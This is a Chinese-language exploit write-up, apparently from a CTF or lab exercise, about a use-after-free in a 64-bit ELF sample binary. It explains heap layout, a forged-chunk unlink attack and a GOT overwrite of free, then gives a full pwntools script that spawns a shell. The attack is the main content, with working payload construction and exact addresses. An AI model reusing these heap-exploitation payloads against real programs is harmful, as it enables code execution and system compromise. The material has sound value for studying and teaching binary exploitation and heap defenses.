# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，总结执行环境如下：

- **二进制类型**：64位ELF可执行文件，动态链接
- **安全机制**：
  - Partial RELRO：GOT表可写，为GOT覆盖攻击提供条件
  - 无PIE：代码段和数据段地址固定，便于计算偏移
  - 无栈保护：栈溢出保护未启用
  - 堆保护：标准ptmalloc实现，无额外堆保护
- **依赖库**：依赖系统libc，地址通过ASLR随机化
- **堆管理器**：glibc ptmalloc（基于main_arena的管理）
- **运行要求**：Linux环境，需要执行权限，依赖标准C库

## 漏洞成因

### 关键结构体分析
程序使用全局指针数组 `s`（地址 `0x6020D8`）管理堆内存：
- 数组大小：10个8字节指针
- 功能：存储通过选项1分配的堆内存地址
- 生命周期：程序运行期间持续存在

### 漏洞详细分析
**漏洞类型**：Use-After-Free (UAF)

**漏洞位置**：
- `sub_400AB7` 函数（选项2 - 释放功能）
- `sub_400B2F` 函数（选项3 - 编辑功能）

**漏洞触发流程**：
1. **释放后未置空**：在 `sub_400AB7` 中执行 `free((&s)[v1])` 后，未将 `s[v1]` 指针置为NULL
2. **UAF读写**：在 `sub_400B2F` 中直接使用已释放的指针：
   ```c
   v2 = strlen((&s)[v1]);          // 对已释放内存调用strlen
   sub_4008B6((&s)[v1], v2 + 1);   // 向已释放内存写入数据
   ```
3. **利用链**：分配 → 释放 → 编辑 → UAF读写 → 内存破坏

**漏洞影响**：通过UAF可实现任意地址读写、GOT表覆盖、最终获得代码执行权限。

## 漏洞利用过程

### 内存变化时序表
| 步骤 | EXP操作 | 全局数组s状态 | 堆状态 | 关键内存变化 | 利用阶段 |
|------|---------|---------------|--------|--------------|----------|
| 1 | 程序初始化 | 全部为0 | 无堆段 | 程序启动完成 | 准备阶段 |
| 2 | 分配5个chunk | s[0]-s[4]填充堆指针 | 堆段创建，5chunk分配 | `/bin/sh`字符串就位 | 布局阶段 |
| 3 | 释放chunk 3,4 | s[0]指向已释放内存 | chunk 3进入unsorted bin | UAF条件建立 | 漏洞触发 |
| 4 | 创建伪造chunk | s[2]指向伪造结构 | 伪造fd/bk指向s数组附近 | unlink攻击准备 | 武器化 |
| 5 | 触发unlink | s[0]修改为0x6020c0 | unlink执行成功 | 获得任意写原语 | 权限提升 |
| 6 | 尝试GOT覆盖 | s[9]写入"1111" | free@GOT部分覆盖失败 | strlen返回0限制 | 利用调整 |
| 7 | 成功GOT覆盖 | s[9]写入"2222" | free@GOT覆盖为0x4009c0 | GOT劫持完成 | 攻击完成 |
| 8 | 触发free调用 | - | 执行func_addr代码 | 进程替换为/bin/dash | 代码执行 |
| 9 | 获得shell | - | 完整shell环境 | 交互式访问 | 利用成功 |

### 关键内存地址演变
- **全局数组s**: `0x6020D8` (固定)
- **free@GOT**: `0x602018` → 从libc地址变为 `0x4009C0`
- **堆基址**: 从无到 `0x13e05000`，最终替换为shell堆 `0x60a8a123c000`
- **执行流**: 目标程序代码 → func_addr → execve → /bin/dash

### 利用技术要点
1. **UAF读写**：通过编辑已释放chunk实现内存操作
2. **堆风水**：精心安排chunk分配和释放顺序
3. **unlink攻击**：伪造chunk结构触发ptmalloc的unlink操作
4. **GOT覆盖**：利用Partial RELRO覆盖free@GOT
5. **代码执行**：通过func_addr触发shell执行

## Exploit

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample9')
p = process('./data/sample9')
libc = elf.libc

# 关键地址定义
func_addr = 0x4009C0    # 目标函数地址，包含system调用
free_got_plt = 0x602018 # free函数的GOT表地址
p_addr = 0x6020D8       # 全局指针数组s的地址

# 功能封装函数
def create(size, content):
    """分配指定大小的堆内存并写入内容"""
    p.sendline(b'1')
    p.sendline(str(size).encode())
    p.send(content)

def modify(idx, content1, content2):
    """编辑指定索引的字符串内容（UAF漏洞点）"""
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.send(content1)
    p.send(content2)

def delete(idx):
    """释放指定索引的堆内存（UAF漏洞点）"""
    p.sendline(b'2')
    p.sendline(str(idx).encode())

# 漏洞利用主流程
p.recvuntil('silent2')  # step.1 - 等待程序初始化完成

# step.2 - 堆内存布局：分配5个chunk，其中chunk2包含/bin/sh字符串
create(0x100, b'AAAA')
create(0x100, b'BBBB') 
create(0x100, b'/bin/sh\x00')  # 为system调用准备参数
create(0x100, b'DDDD')
create(0x100, b'EEEEE')

# step.3 - 创建UAF条件：释放chunk3和chunk4，但指针未置空
delete(3)
delete(4)

# step.4 - 构造unlink攻击payload：伪造chunk结构指向全局数组附近
payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10)
payload += b'A' * (0x100 - 0x20) + p64(0x100) + p64(0x210 - 0x100)
create(0x210, payload)  # 重新分配chunk3并写入伪造结构

# step.5 - 触发unlink攻击：释放chunk4触发ptmalloc的unlink操作
delete(4)  # unlink执行，s[0]被修改为0x6020c0

# step.6 - 尝试GOT覆盖：由于strlen返回0，只写入部分数据
modify(3, p64(free_got_plt)[0:4], b'1111')

# step.7 - 成功GOT覆盖：通过s[0]的指针链覆盖free@GOT
modify(0, p64(func_addr)[0:6], b'2222')  # free@GOT现在指向func_addr

# step.8 - 触发漏洞利用：调用free实际执行func_addr的代码
delete(2)  # 触发system("/bin/sh")，获得shell

# step.9 - 进入交互模式
p.interactive()
```

### 关键注释说明
- **地址计算**：`p_addr - 0x18` 和 `p_addr - 0x10` 精心计算以绕过unlink检查
- **payload构造**：伪造的chunk结构符合ptmalloc的size和对齐要求
- **GOT覆盖**：利用UAF形成的指针链实现任意地址写
- **触发时机**：通过正常的free调用触发被劫持的执行流

### 利用成功标志
- 进程从目标程序完全替换为 `/bin/dash`
- 内存映射中只有shell的代码段，无原始程序痕迹
- 获得交互式shell权限，可执行任意命令

此漏洞利用成功演示了如何通过UAF漏洞绕过现代操作系统的多种安全机制，最终获得完整的代码执行权限。
